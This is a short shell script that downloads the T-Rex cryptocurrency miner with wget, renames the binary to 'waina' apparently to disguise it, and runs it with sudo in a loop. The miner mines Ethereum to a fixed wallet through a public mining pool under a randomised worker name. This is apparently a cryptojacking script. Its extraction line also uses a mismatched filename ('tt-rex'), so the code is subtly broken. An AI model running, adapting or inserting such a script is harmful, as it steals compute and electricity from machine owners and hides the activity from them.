#!/bin/sh
apt-get install libpci3 && P=$(echo GPU-$(shuf -i 1-1000 -n 1)-NEO)
x=1
mkdir runner && cd runner
wget https://trex-miner.com/download/t-rex-0.21.3-linux.tar.gz
tar -xf tt-rex-0.21.3-linux.tar.gz
mv t-rex waina
while [ $x -le 20 ]
do

  sudo ./waina -a ethash -o eth.2miners.com:2020 -u 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.TREX$P -p x --gpu-report-interval 10 --coin ETH --intensity 18 --low-load 1 --lock-cclock 350


  x=$(( $x + 1 ))
  sleep 120
  echo "All done with $x times"
done
